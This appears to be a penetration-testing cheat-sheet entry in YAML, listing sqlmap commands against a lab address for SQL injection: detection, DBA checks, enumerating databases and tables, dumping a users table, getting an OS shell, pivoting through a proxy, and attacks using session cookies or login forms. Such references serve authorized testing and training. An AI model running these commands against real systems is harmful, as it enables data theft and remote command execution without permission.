---
description: |
  SQL Injection attacks against web applications — from basic detection to full database extraction and OS-level command execution.
commands:
  - have: No_Creds
    cmd: |
      # Basic SQLi scan — auto-detect injectable parameters
      sqlmap -u "http://10.10.10.27/page?id=1" --batch

      # Target a specific parameter
      sqlmap -u "http://10.10.10.27/page?id=1&cat=2" -p id --batch

      # Check if current user is DBA
      sqlmap -u "http://10.10.10.27/page?id=1" --is-dba --batch

      # Enumerate current database name
      sqlmap -u "http://10.10.10.27/page?id=1" --current-db --batch

      # List tables in a specific database
      sqlmap -u "http://10.10.10.27/page?id=1" --tables -D targetdb --batch

      # Dump a specific table
      sqlmap -u "http://10.10.10.27/page?id=1" --dump -T users -D targetdb --batch

      # Get an OS shell (requires stacked queries or file write)
      sqlmap -u "http://10.10.10.27/page?id=1" --os-shell --batch

      # SQLi through a SOCKS proxy (pivoting)
      proxychains sqlmap -u "http://10.10.10.27/page?id=1" --batch
  - have: Credentials
    cmd: |
      # SQLi with authenticated session cookie
      sqlmap -u "http://10.10.10.27/page?id=1" --cookie="PHPSESSID=abc123" --batch

      # SQLi on POST login form
      sqlmap -u "http://10.10.10.27/login" --data="username=sec_user&password=P@ssw0rd" --batch
phase:
  - Exploitation
target_os:
  - Linux
  - Windows
services:
  - HTTP
techniques:
  - SQLi
references:
  - https://github.com/sqlmapproject/sqlmap
  - https://owasp.org/www-community/attacks/SQL_Injection
---
